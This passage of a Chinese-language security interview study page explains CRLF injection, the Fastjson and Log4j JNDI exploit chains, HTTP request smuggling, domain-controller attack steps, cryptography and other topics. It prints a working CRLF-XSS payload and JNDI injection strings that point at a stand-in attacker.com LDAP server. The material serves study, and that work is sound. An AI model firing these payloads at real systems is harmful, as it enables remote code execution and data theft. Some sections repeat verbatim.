<li><strong>错误的配置</strong>：某些系统配置错误（如开启危险的PHP函数）也可能导致命令执行漏洞。</li>
</ul>
<hr>
<h3 id="8-内网攻击"><a href="#8-内网攻击" class="headerlink" title="8. 内网攻击"></a>8. 内网攻击</h3><h4 id="内网域控攻击"><a href="#内网域控攻击" class="headerlink" title="内网域控攻击"></a>内网域控攻击</h4><p>攻击内网域控（Domain Controller）通常包括以下步骤：</p>
<ul>
<li><strong>信息收集</strong>：通过工具（如<code>BloodHound</code>）分析域控结构，寻找权限提升路径。</li>
<li><strong>横向移动</strong>：利用获取到的用户凭证，通过工具（如<code>PsExec</code>）在内网横向移动。</li>
<li><strong>权限提升</strong>：通过漏洞（如<code>PrintNightmare</code>）或配置错误提升权限。</li>
<li><strong>域控攻击</strong>：通过工具（如<code>Mimikatz</code>）获取域控的哈希值，进而尝试破解或传递哈希。</li>
</ul>
<h3 id="9-业务漏洞"><a href="#9-业务漏洞" class="headerlink" title="9. 业务漏洞"></a>9. 业务漏洞</h3><h4 id="安全登录框设计"><a href="#安全登录框设计" class="headerlink" title="安全登录框设计"></a>安全登录框设计</h4><p>设计一个安全的登录框需要考虑以下方面：</p>
<ul>
<li><strong>输入验证</strong>：对用户名和密码进行严格验证，防止SQL注入、XSS等攻击。</li>
<li><strong>密码策略</strong>：要求用户设置强密码，并限制密码尝试次数。</li>
<li><strong>多因素认证</strong>：增加额外的认证方式（如短信验证码、指纹认证）。</li>
<li><strong>日志记录</strong>：记录登录失败的尝试，以便发现异常行为。</li>
</ul>
<h4 id="校验合法登录的模式"><a href="#校验合法登录的模式" class="headerlink" title="校验合法登录的模式"></a>校验合法登录的模式</h4><ul>
<li><strong>基于密码的验证</strong>：用户名+密码，密码通过哈希存储。</li>
<li><strong>多因素验证</strong>：用户名+密码+验证码（短信、邮件、App）。</li>
<li><strong>生物识别验证</strong>：指纹、面部识别等。</li>
<li><strong>令牌验证</strong>：使用硬件令牌或软件令牌生成一次性密码。</li>
</ul>
<h4 id="登录流程"><a href="#登录流程" class="headerlink" title="登录流程"></a>登录流程</h4><ol>
<li>用户输入用户名和密码。</li>
<li>系统对输入进行验证（如长度、特殊字符等）。</li>
<li>系统查询数据库，验证用户名和密码是否匹配。</li>
<li>如果匹配，生成会话令牌（如Cookie、JWT）并返回给用户。</li>
<li>如果不匹配，记录失败尝试并提示用户。</li>
</ol>
<hr>
<h3 id="对安全信息和事件管理-SIEM-系统的理解"><a href="#对安全信息和事件管理-SIEM-系统的理解" class="headerlink" title="对安全信息和事件管理(SIEM)系统的理解"></a>对安全信息和事件管理(SIEM)系统的理解</h3><p>SIEM系统是一种安全解决方案，它能够收集、分析并报告来自各种安全设备和应用程序的数据。它的核心功能包括日志管理、实时监控、安全事件的检测和响应、合规性报告等。</p>
<p>SIEM 是 Security Information Event Management 的首字母简称，即安全信息与事件管理平台。 Gartner对于SIEM的定义是：安全信息和事件管理（SIEM）技术通过对来自各种事件和上下文数据源的安全事件的实时收集和历史分析来支持威胁检测和安全事件响应。它还通过分析来自这些来源的历史数据来支持合规报告和事件调查。SIEM技术的核心功能是广泛的事件收集，以及跨不同来源关联和分析事件的能力。SIEM技术已经存在了十多年，是从日志管理学科发展而来的。最初是基于传统的日志收集和管理，引入了对日志数据的长期存储，分析和报告，并将日志与威胁情报结合起来（SIM）；后来具备可以解决系统安全事件的能力：通过对防病毒系统、防火墙和入侵检测等事件的聚合、关联，实时分析日志和事件数据，提供威胁监控和事件响应（SEM）。 高级的SIEM已经发展到包括用户行为分析（UEBA）以及安全编排自动响应（SOAR）。 用户行为分析（UEBA）- 高级SIEM超越了规则和相关性，利用AI和深度学习技术来研究人类行为的模式，有助于检测内部威胁、针对性攻击和欺骗。 安全编排自动化响应（SOAR） - SIEM与企业系统集成并自动化响应事件。例如，在攻击者可以加密数据之前，SIEM可能会检测到勒索软件的警报并在受影响的系统上自动执行应对操作。</p>
<ul>
<li><strong>日志管理</strong>：SIEM系统能够集中存储和分析来自不同源的日志数据，包括防火墙、入侵检测系统、服务器、应用程序等。</li>
<li><strong>实时监控</strong>：通过实时分析日志数据，SIEM能够及时发现异常行为或安全威胁。</li>
<li><strong>安全事件检测</strong>：利用预定义的规则或机器学习算法，SIEM可以识别出潜在的安全事件和攻击模式。</li>
<li><strong>合规性报告</strong>：SIEM系统能够帮助组织满足各种合规性要求，如GDPR、HIPAA等，通过生成必要的报告和审计日志。</li>
</ul>
<h3 id="8-CSRF攻击及防范"><a href="#8-CSRF攻击及防范" class="headerlink" title="8. CSRF攻击及防范"></a>8. CSRF攻击及防范</h3><p><strong>CSRF（跨站请求伪造）</strong>是一种攻击方式，攻击者诱使用户在已经认证的网站上执行非本意的操作。例如，攻击者可以诱使用户点击一个链接，从而在用户已经登录的银行网站上执行转账操作。</p>
<p><strong>防范措施</strong>包括：</p>
<ul>
<li><strong>使用Token</strong>：在每个表单或请求中加入一个唯一的Token，服务器在处理请求时验证Token的有效性。</li>
<li><strong>SameSite Cookie</strong>：设置Cookie的SameSite属性，限制Cookie在跨站请求中的发送。</li>
<li><strong>验证Referer头</strong>：检查请求的Referer头，确保请求是从合法的页面发起的。</li>
<li><strong>安全编程</strong>：在开发过程中，遵循安全编码的最佳实践，避免引入CSRF漏洞。</li>
</ul>
<h3 id="CRLF-漏洞如何利用最大化"><a href="#CRLF-漏洞如何利用最大化" class="headerlink" title="CRLF 漏洞如何利用最大化"></a>CRLF 漏洞如何利用最大化</h3><p>CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）“，全称为Carriage Return&#x2F;Line Feed”，十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。<br>而在HTTP协议中，HTTP header之间是由一个CRLF字符序列分隔开的，HTTP Header与Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。<br>所以如果用户的输入在HTTP返回包的Header处回显，便可以通过CRLF来提前结束响应头，在响应内容处注入攻击脚本。因此CRLF Injection又叫HTTP响应拆分&#x2F;截断（HTTP Response Splitting）简称HRS。</p>
<ol>
<li><strong>观察输出</strong>：首先，需要观察输出是否在返回头中，查看输入，可能是在URL值和参数、cookie头中。在过往的挖掘过程中，最常见的两种情况是使用输入参数创建Cookie和302跳转location处。</li>
<li><strong>提交%0D%0A字符</strong>：提交<code>%0D%0A</code>字符，验证服务器是否响应<code>%0D%0A</code>，若过滤可以通过双重编码绕过。</li>
<li><strong>漏洞利用</strong>：使杀伤最大化，将漏洞转化为HTML注入，XSS，缓存等。例如，可以通过注入<code>X-XSS-Protection:0</code>来绕过浏览器的XSS保护机制，从而执行反射型XSS攻击。</li>
<li><strong>构造Payload</strong>：构造特定的Payload来实现攻击目的。例如，可以使用以下Payload进行CRLF-XSS攻击：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</span><br></pre></td></tr></table></figure>
这个Payload首先设置<code>Content-Length</code>来控制响应的长度，然后注入<code>X-XSS-Protection:0</code>来禁用XSS保护，最后注入XSS攻击代码。</li>
<li><strong>防御手段</strong>：了解防御手段有助于更好地利用漏洞。防御手段包括对用户的数据进行合法性校验，对特殊的字符进行编码，如<code>&lt;</code>、<code>&gt;</code>、<code>’</code>、<code>&quot;</code>、CR、LF等，限制用户输入的CR和LF，或者对CR和LF字符正确编码后再输出，以防止注入自定义HTTP头。<br>还可以造成双重响应，类似下图<br><img src="/2024/03/16/work/workpre3/image.png"></li>
</ol>
<h3 id="Fastjson的反序列化漏洞利用链主要涉及以下几个步骤："><a href="#Fastjson的反序列化漏洞利用链主要涉及以下几个步骤：" class="headerlink" title="Fastjson的反序列化漏洞利用链主要涉及以下几个步骤："></a>Fastjson的反序列化漏洞利用链主要涉及以下几个步骤：</h3><p><a target="_blank" rel="noopener" href="https://alibaba.github.io/fastjson2/">Fastjson简单介绍</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130100893">Fastjson反序列化漏洞</a> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/365680.html">https://www.freebuf.com/articles/web/365680.html</a></p>
<ol>
<li><strong>目标类加载</strong>：Fastjson实例化JdbcRowSetImpl类（Oracle JDK内置类）。</li>
<li><strong>Setter方法触发</strong>：调用setDataSourceName(“ldap:&#x2F;&#x2F;attacker.com&#x2F;Exploit”)设置JNDI数据源。</li>
<li><strong>JNDI上下文连接</strong>：调用setAutoCommit(true) → 触发connect()方法 → 向恶意LDAP服务器发起请求。</li>
<li><strong>远程代码加载</strong>：LDAP服务器返回指向<a target="_blank" rel="noopener" href="http://attacker.com/Exploit.class%E7%9A%84Reference%E5%AF%B9%E8%B1%A1">http://attacker.com/Exploit.class的Reference对象</a> → JVM加载并执行远程恶意类。<br>攻击者利用Fastjson的AutoType特性，发送恶意JSON数据，触发反序列化漏洞，从而执行恶意代码。例如，攻击者可以构造如下恶意JSON数据：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">  &quot;dataSourceName&quot;:&quot;ldap://attacker.com/Exploit&quot;,</span><br><span class="line">  &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1634343">有关Fastjson安全相关的内容可以看这个</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/johnnyzen/p/17814937.html">还有这个</a></li>
</ol>
<h3 id="Log4j漏洞"><a href="#Log4j漏洞" class="headerlink" title="Log4j漏洞"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/csd_ct/article/details/122916620">Log4j漏洞</a></h3><p>特别是CVE-2021-44228，是一个由于JNDI查找功能导致的远程代码执行（RCE）漏洞。攻击者可以通过构造特制的恶意日志输入，利用Log4j的JNDI远程加载功能来执行代码。以下是该漏洞的详细利用链：</p>
<ol>
<li><strong>日志记录输入</strong>：攻击者控制的输入被记录为日志消息，例如通过Web应用程序的用户输入。</li>
<li><strong>JNDI注入</strong>：Log4j在处理日志事件时，会解析日志消息中的变量，包括JNDI查找表达式，如<code>$&#123;jndi:ldap://attacker.com/malicious&#125;</code>。<a target="_blank" rel="noopener" href="https://blog.csdn.net/wn084/article/details/80729230">有关JNDI可以看这篇博客讲的很好</a></li>
<li><strong>JNDI服务查询</strong>：Log4j通过JNDI服务尝试解析表达式，这导致向攻击者控制的LDAP服务器发起查询。</li>
<li><strong>恶意类加载</strong>：攻击者在LDAP服务器上托管恶意类，当Log4j尝试通过JNDI加载资源时，它会从LDAP服务器加载并实例化这个恶意类。</li>
<li><strong>代码执行</strong>：恶意类在其构造函数或静态初始化块中包含恶意代码，当类被加载时，代码被执行，从而允许攻击者在受害者的系统上执行任意代码。</li>
</ol>
<p>这种攻击链利用了Log4j的递归解析功能，该功能允许攻击者构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
<h3 id="TLS降级漏洞"><a href="#TLS降级漏洞" class="headerlink" title="TLS降级漏洞"></a>TLS降级漏洞</h3><p>TLS 1.0协议的安全问题尤为突出，存在多个已知漏洞，例如：BEAST攻击：利用TLS 1.0的加密弱点，攻击者可以窃取加密数据。POODLE攻击：通过降级攻击迫使服务器使用TLS 1.0，从而利用其漏洞解密数据。缺乏现代加密算法支持：TLS 1.0不支持更安全的加密算法（如AES-GCM），导致数据容易被破解。<br>POODLE（Padding Oracle On Downgraded Legacy Encryption）漏洞是一种影响SSLv3协议的安全漏洞，它使得攻击者能够通过中间人攻击的方式，窃取在HTTPS通信中的敏感信息，例如用户的登录凭证、cookie等。攻击者可以利用SSLv3协议的一种弱点来实现的。在SSLv3协议中，如果服务器端支持SSLv3协议，但客户端请求使用TLS协议时，服务器会自动降级到SSLv3协议。攻击者可以利用这个特性，通过逐字节地试探服务器和客户端之间的通信，来获取加密数据的明文。<br>POODLE攻击利用了SSL 3.0 和 TLS 1.0 中的漏洞。攻击者可以强制浏览器降级到 SSL 3.0，然后利用其中的漏洞破解加密。POODLE 攻击利用了 SSL 3.0 和 TLS 1.0 中的漏洞。攻击者可以强制浏览器降级到 SSL 3.0，然后利用其中的漏洞破解加密。由于 TLS 1.0 支持降级到 SSL 3.0，因此也受到 POODLE 攻击的影响。</p>
<h3 id="HTTP请求走私漏洞"><a href="#HTTP请求走私漏洞" class="headerlink" title="HTTP请求走私漏洞"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/243652.html">HTTP请求走私漏洞</a></h3><p>它允许攻击者利用HTTP协议的某些特性来绕过安全控制，执行未授权的操作。这种漏洞通常发生在使用HTTP&#x2F;1协议的系统中，因为HTTP&#x2F;1规范提供了两种不同的方法来指定请求的结束：<code>Content-Length</code> 头和 <code>Transfer-Encoding</code> 头。<br>HTTP请求走私漏洞产生的原因是前端和后端服务器对HTTP请求的处理方式不一致。例如，前端服务器可能使用<code>Content-Length</code>标头来确定请求的结束，而后端服务器可能使用<code>Transfer-Encoding</code>标头。这种不一致可能导致请求被错误地解析，从而允许攻击者插入额外的请求或修改现有请求。</p>
<p>攻击者可以通过构造特殊的HTTP请求来利用这种漏洞，例如：</p>
<ol>
<li><strong>CL.TE漏洞</strong>：前端服务器处理<code>Content-Length</code>标头，并确定请求正文的长度为13字节，直到<code>SMUGGLED</code>的末尾。此请求将转发到后端服务器。后端服务器处理<code>Transfer-Encoding</code>标头，因此将消息正文视为使用分块编码。它处理第一个块，该块被声明为零长度，因此被视为终止请求。以下字节<code>SMUGGLED</code>未被处理，后端服务器会将这些字节视为序列中下一个请求的开始。</li>
<li><strong>绕过前端安全控制</strong>：在某些应用程序中，前端Web服务器用于实现一些安全控制，决定是否允许处理单个请求。允许的请求将转发到后端服务器，在那里它们被视为已通过前端控件。HTTP请求走私漏洞可用于绕过访问控制，方法是将请求走私到受限制的URL。</li>
<li><strong>捕获其他用户的请求</strong>：如果应用程序包含任何类型的功能，允许您存储和稍后检索文本数据，则可能会使用它来捕获其他用户请求的内容。这些可能包括用户提交的会话令牌或其他敏感数据。</li>
<li><strong>利用反射型XSS</strong>：如果应用程序容易受到HTTP请求走私的攻击，并且还包含反射型XSS，则可以使用请求走私攻击来攻击应用程序的其他用户。</li>
<li><strong>执行Web缓存中毒</strong>：利用HTTP请求走私来执行Web缓存中毒攻击。如果前端基础设施的任何部分执行内容缓存，则可能会使用站外重定向响应来毒害缓存。这将使攻击持续存在，影响随后请求受影响URL的任何用户。</li>
</ol>
<p>为了防止HTTP请求走私，可以采取以下措施：</p>
<ul>
<li>确保所有服务器和代理都使用统一的方法来解析HTTP请求。</li>
<li>禁用不安全的HTTP特性，如<code>Transfer-Encoding</code>。</li>
<li>使用HTTP&#x2F;2或更高版本的协议，这些协议提供了更严格的请求处理机制。</li>
<li>实施严格的输入验证和输出编码，以防止恶意数据的注入。</li>
<li>定期进行安全审计和渗透测试，以发现和修复潜在的安全漏洞。</li>
</ul>
<p>开放最短路径优先（Open Shortest Path First，OSPF）是一种基于链路状态的内部网关协议（IGP），广泛应用于大型企业网络和互联网服务提供商（ISP）中。OSPF协议的核心之一是SPF（Shortest Path First）算法，即最短路径优先算法。SPF算法基于Dijkstra算法，用于计算网络中各节点之间的最优路径。</p>
<h3 id="OSPF算法的基本原理"><a href="#OSPF算法的基本原理" class="headerlink" title="OSPF算法的基本原理"></a>OSPF算法的基本原理</h3><p>SPF算法是一种用于解决图论中单源最短路径问题的算法，最初由荷兰计算机科学家Edsger W. Dijkstra提出。在OSPF中，SPF算法用于计算路由器到网络中其他节点的最短路径。具体来说，每个运行OSPF的路由器都会维护一个链路状态数据库（LSDB），该数据库中存储了网络中所有路由器的链路状态信息。当LSDB更新完成后，路由器会运行SPF算法，生成一棵以该路由器为根的最短路径树（Shortest Path Tree, SPT），从而确定数据包转发的最佳路径。</p>
<p>SPF算法的实现步骤</p>
<ol>
<li><strong>初始化</strong>：选择一个起点（通常是运行SPF算法的路由器本身），并将起点的最短路径距离设为0。将所有其他节点的最短路径距离设为无穷大。创建一个未处理节点列表，将所有节点加入该列表。</li>
<li><strong>选择最近节点</strong>：从未处理节点列表中选择一个距离起点最近的节点，标记为已处理。将该节点从未处理节点列表中移除。</li>
<li><strong>更新邻居节点的距离</strong>：对于已处理节点的所有邻居节点，计算从起点到这些邻居节点的路径距离。如果新计算的距离小于当前记录的距离，则更新邻居节点的最短路径距离，并记录前驱节点（即从起点到该邻居节点的上一个节点）。</li>
<li><strong>重复步骤2和3</strong>：重复上述步骤，直到所有节点都被标记为已处理。</li>
<li><strong>生成最短路径树（SPT）</strong>：SPF算法执行完毕后，会生成一棵以该路由器为根的最短路径树（SPT）。SPT描述了从该路由器到网络中所有其他节点的最优路径，路由器根据SPT中的信息更新其路由表，从而确定数据包转发的最佳路由。</li>
</ol>
<h3 id="半扫描"><a href="#半扫描" class="headerlink" title="半扫描"></a>半扫描</h3><p>在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN&#x2F;ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且部分防火墙已经开始对这种扫描方式做处理。</p>
<p>为什么半扫描需要较高权限？访问原始套接字：执行半扫描需要使用原始套接字（Raw Sockets），这允许直接访问和控制TCP&#x2F;IP协议栈。原始套接字提供了对网络层协议的底层访问，使得发送和接收未加工的IP数据包成为可能。在大多数操作系统中，只有具有足够权限（通常是root或管理员权限）的用户才能创建和使用原始套接字。</p>
<h3 id="Shiro漏洞特征"><a href="#Shiro漏洞特征" class="headerlink" title="Shiro漏洞特征"></a>Shiro漏洞特征</h3><p>Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理。Shiro的一个著名漏洞是反序列化漏洞，这允许攻击者通过构造恶意的序列化数据来执行任意代码。<br>反序列化：攻击者利用Shiro的默认CookieRememberMeManager，该管理器使用Base64解码然后反序列化RememberMe Cookie。<br>漏洞利用：攻击者可以通过发送恶意构造的RememberMe Cookie来执行远程代码。<br>漏洞编号：如CVE-2016-4437。<br>550, 721：这些数字可能指的是网络协议或特定系统的错误代码。例如，在SMTP（邮件传输协议）中，550表示“请求的操作未完成，邮箱不可用”；721可能指的是拨号访问中的一个错误代码，表示“硬件故障”。</p>
<h3 id="AES加密原理"><a href="#AES加密原理" class="headerlink" title="AES加密原理"></a>AES加密原理</h3><p>AES（高级加密标准）是一种对称密钥加密标准，用于替代旧的DES加密标准。AES加密使用相同的密钥进行加密和解密。</p>
<h3 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h3><p>进程（Process）：</p>
<ul>
<li>进程是操作系统进行资源分配和调度的基本单位。</li>
<li>每个进程都有独立的内存空间，至少包括代码段、数据段和堆栈。</li>
<li>进程间的通信（IPC）复杂，因为它们有不同的内存空间，需要特定的机制来交换信息，如管道、消息队列、共享内存等。</li>
<li>进程的创建和销毁开销较大，因为涉及到资源的分配和回收。<br>线程（Thread）：</li>
<li>线程是进程中的一个执行流，是CPU调度和执行的基本单位。</li>
<li>线程共享进程的内存空间，包括代码段、数据段和堆，但每个线程有自己的堆栈。</li>
<li>线程间的通信更简单，因为它们共享同一内存空间，可以直接读写数据。</li>
<li>线程的创建和销毁开销较小，因为它们共享进程资源。<br>区别：</li>
<li>进程是资源分配的单位，线程是CPU调度的单位。</li>
<li>进程有独立的内存空间，线程共享内存空间。</li>
<li>进程间通信复杂，线程间通信简单。</li>
<li>进程创建销毁开销大，线程创建销毁开销小。</li>
</ul>
<h3 id="（2）冒泡排序原理"><a href="#（2）冒泡排序原理" class="headerlink" title="（2）冒泡排序原理"></a>（2）冒泡排序原理</h3><p>冒泡排序是一种简单的排序算法，它重复地遍历要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。<br>原理：</p>
<ul>
<li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li>
<li>对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li>
<li>针对所有的元素重复以上的步骤，除了最后一个。</li>
<li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。<br>特点：</li>
<li>冒泡排序是稳定的排序方法。</li>
<li>平均时间复杂度和最差时间复杂度为O(n^2)，最好时间复杂度为O(n)。</li>
<li>冒泡排序在实现上很简单，但效率不高。</li>
</ul>
<h3 id="（1）进程和线程的区别"><a href="#（1）进程和线程的区别" class="headerlink" title="（1）进程和线程的区别"></a>（1）进程和线程的区别</h3><p><strong>进程（Process）</strong>：</p>
<ul>
<li>进程是操作系统进行资源分配和调度的基本单位。</li>
<li>每个进程都有独立的内存空间，至少包括代码段、数据段和堆栈。</li>
<li>进程间的通信（IPC）复杂，因为它们有不同的内存空间，需要特定的机制来交换信息，如管道、消息队列、共享内存等。</li>
<li>进程的创建和销毁开销较大，因为涉及到资源的分配和回收。</li>
</ul>
<p><strong>线程（Thread）</strong>：</p>
<ul>
<li>线程是进程中的一个执行流，是CPU调度和执行的基本单位。</li>
<li>线程共享进程的内存空间，包括代码段、数据段和堆，但每个线程有自己的堆栈。</li>
<li>线程间的通信更简单，因为它们共享同一内存空间，可以直接读写数据。</li>
<li>线程的创建和销毁开销较小，因为它们共享进程资源。</li>
</ul>
<p><strong>区别</strong>：</p>
<ul>
<li>进程是资源分配的单位，线程是CPU调度的单位。</li>
<li>进程有独立的内存空间，线程共享内存空间。</li>
<li>进程间通信复杂，线程间通信简单。</li>
<li>进程创建销毁开销大，线程创建销毁开销小。</li>
</ul>
<h3 id="（2）冒泡排序原理-1"><a href="#（2）冒泡排序原理-1" class="headerlink" title="（2）冒泡排序原理"></a>（2）冒泡排序原理</h3><p>冒泡排序是一种简单的排序算法，它重复地遍历要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。</p>
<p><strong>原理</strong>：</p>
<ol>
<li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li>
<li>对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li>
<li>针对所有的元素重复以上的步骤，除了最后一个。</li>
<li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li>
</ol>
<p><strong>特点</strong>：</p>
<ul>
<li>冒泡排序是稳定的排序方法。</li>
<li>平均时间复杂度和最差时间复杂度为O(n^2)，最好时间复杂度为O(n)。</li>
<li>冒泡排序在实现上很简单，但效率不高。</li>
</ul>
<h3 id="（6）对称加密、非对称加密以及hash算法举例及算法流程细节"><a href="#（6）对称加密、非对称加密以及hash算法举例及算法流程细节" class="headerlink" title="（6）对称加密、非对称加密以及hash算法举例及算法流程细节"></a>（6）对称加密、非对称加密以及hash算法举例及算法流程细节</h3><p><strong>对称加密</strong>：</p>
<ul>
<li><strong>AES（高级加密标准）</strong>：<ol>
<li>初始化：选择一个密钥和一个初始化向量（IV）。</li>
<li>加密：使用密钥和IV对数据进行加密。</li>
<li>解密：使用相同的密钥和IV对加密数据进行解密。</li>
</ol>
</li>
<li><strong>DES（数据加密标准）</strong>：<ol>
<li>初始化：选择一个密钥。</li>
<li>加密：使用密钥对数据进行加密。</li>
<li>解密：使用相同的密钥对加密数据进行解密。</li>
</ol>
</li>
</ul>
<p><strong>非对称加密</strong>：</p>
<ul>
<li><strong>RSA</strong>：<ol>
<li>密钥生成：选择两个大素数p和q，计算n&#x3D;p<em>q，计算φ(n)&#x3D;(p-1)</em>(q-1)，选择一个整数e，使得1&lt;e&lt;φ(n)且gcd(e,φ(n))&#x3D;1，计算d，使得d*e≡1 (mod φ(n))。</li>
<li>加密：使用公钥(e, n)对数据进行加密，C ≡ M^e (mod n)。</li>
<li>解密：使用私钥(d, n)对加密数据进行解密，M ≡ C^d (mod n)。</li>
</ol>
</li>
<li><strong>ECC（椭圆曲线密码学）</strong>：<ol>
<li>密钥生成：选择一个椭圆曲线和一个基点G，生成私钥k，计算公钥K&#x3D;kG。</li>
<li>加密：使用接收方的公钥K对数据进行加密。</li>
<li>解密：使用私钥k对加密数据进行解密。</li>
</ol>
</li>
</ul>
<p><strong>Hash算法</strong>：</p>
<ul>
<li><strong>SHA-256（安全哈希算法256位）</strong>：<ol>
<li>预处理：将输入消息填充到长度模512位等于448位，然后添加长度值。</li>
<li>初始化：设置初始哈希值。</li>
<li>处理消息：将消息分成512位的块，对每个块进行处理。</li>
<li>输出：输出最终的哈希值。</li>
</ol>
</li>
<li><strong>MD5（消息摘要算法5）</strong>：<ol>
<li>预处理：将输入消息填充到长度模64位等于56位，然后添加长度值。</li>
<li>初始化：设置初始哈希值。</li>
<li>处理消息：将消息分成512位的块，对每个块进行处理。</li>
<li>输出：输出最终的哈希值。</li>
</ol>
</li>
</ul>
<h3 id="（7）SHA-1和SHA-2区别"><a href="#（7）SHA-1和SHA-2区别" class="headerlink" title="（7）SHA-1和SHA-2区别"></a>（7）SHA-1和SHA-2区别</h3><p><strong>SHA-1</strong>：</p>
<ul>
<li>输出长度：160位（20字节）。</li>
<li>安全性：已被证明存在弱点，可以被碰撞攻击。</li>
<li>速度：相对较快。</li>
</ul>
<p><strong>SHA-2</strong>：</p>
<ul>
<li>输出长度：可以是224位、256位、384位或512位。</li>
<li>安全性：目前被认为是安全的，但随着计算能力的提高，其安全性可能会受到挑战。</li>
<li>速度：相对较慢，但提供了更高的安全性。</li>
</ul>
<p><strong>区别</strong>：</p>
<ul>
<li><strong>输出长度</strong>：SHA-1的输出长度固定为160位，而SHA-2可以有不同的输出长度。</li>
<li><strong>安全性</strong>：SHA-2比SHA-1更安全，SHA-1已被证明存在弱点，可以被碰撞攻击。</li>
<li><strong>速度</strong>：SHA-1的速度相对较快，但SHA-2提供了更高的安全性，尽管速度相对较慢。</li>
</ul>
<p>总的来说，SHA-2比SHA-1更安全，更推荐使用SHA-2进行哈希运算。</p>
<h3 id="详细讲解下ECC"><a href="#详细讲解下ECC" class="headerlink" title="详细讲解下ECC"></a>详细讲解下ECC</h3><p><strong>ECC（椭圆曲线密码学）</strong>是一种基于椭圆曲线数学的非对称加密算法。ECC的安全性基于椭圆曲线上的离散对数问题（ECDLP），该问题的难度使得ECC在较短的密钥长度下也能提供与RSA等传统非对称加密算法相当的安全性。ECC的主要优势包括：</p>
<ul>
<li><strong>密钥长度短</strong>：ECC使用较短的密钥长度即可达到与RSA相同的安全级别，例如，256位的ECC密钥相当于3072位的RSA密钥。</li>
<li><strong>计算效率高</strong>：ECC的数学运算相对简单，计算效率高，适合在资源受限的环境中使用，如移动设备和物联网设备。</li>
<li><strong>带宽要求低</strong>：由于密钥长度短，ECC在传输密钥时占用的带宽较少。<br>ECC的加密和解密过程涉及椭圆曲线上的点运算，包括点加法和标量乘法。这些运算的复杂性使得ECC在加密和数字签名方面非常有效。</li>
</ul>
<h3 id="逆向相关"><a href="#逆向相关" class="headerlink" title="逆向相关"></a>逆向相关</h3><p><strong>抓包工具</strong>：</p>
<ul>
<li><strong>mitmproxy</strong>：一款支持HTTP&#x2F;HTTPS的中间人代理工具，可以用于拦截、修改、保存HTTP&#x2F;HTTPS请求。mitmproxy提供了命令行界面（mitmproxy）、简单的终端输出（mitmdump）和基于Web的界面（mitmweb）。它支持Python脚本，可以对接Python对请求进行处理，实现高度定制化的抓包和数据处理。</li>
<li><strong>Wireshark</strong>：一款网络协议分析工具，可以捕获和分析网络数据包，支持多种协议。</li>
<li><strong>Burp Suite</strong>：一款用于网络安全测试的集成平台，特别适用于Web应用程序的安全测试。</li>
</ul>
<p><strong>获取数据包的方法</strong>：</p>
<ul>
<li><strong>抓包工具</strong>：使用如mitmproxy、Wireshark、Burp Suite等工具进行网络数据包的捕获和分析。</li>
<li><strong>API Hook</strong>：通过Hook API调用，拦截和记录应用与系统或网络的交互数据。</li>
<li><strong>日志记录</strong>：某些应用会在日志中记录详细的运行信息，可以通过分析日志来获取数据包内容。</li>
<li><strong>内存转储</strong>：通过转储应用的内存，提取其中的网络数据包信息。</li>
</ul>
<h3 id="爬虫相关"><a href="#爬虫相关" class="headerlink" title="爬虫相关"></a>爬虫相关</h3><p><strong>爬虫类型</strong>：</p>
<ul>
<li><strong>Web爬虫</strong>：用于爬取网页内容，提取结构化数据。常见的Web爬虫包括Scrapy、Beautiful Soup等。</li>
</ul>
<p><strong>加密数据问题</strong>：</p>
<ul>
<li><strong>处理方法</strong>：在爬取加密数据时，需要分析加密算法和加密过程。例如，对于QQ音乐中的sign加密，可以通过逆向工程分析其加密逻辑，找到解密方法或模拟加密过程来获取有效数据。</li>
</ul>
<p><strong>动态网页爬取</strong>：</p>
<ul>
<li><strong>技术手段</strong>：动态网页通常依赖JavaScript渲染内容，爬虫需要模拟浏览器行为，执行JavaScript代码以获取完整页面内容。常用的工具包括Selenium、Puppeteer等，它们可以控制浏览器自动化操作，等待页面渲染完成后提取数据。</li>
<li><strong>AJAX处理</strong>：对于通过AJAX加载数据的网页，爬虫需要分析AJAX请求的URL、参数和请求头，直接模拟这些请求来获取数据，而不是爬取整个页面。</li>
</ul>
<h3 id="编译和非编译的区别"><a href="#编译和非编译的区别" class="headerlink" title="编译和非编译的区别"></a>编译和非编译的区别</h3><ul>
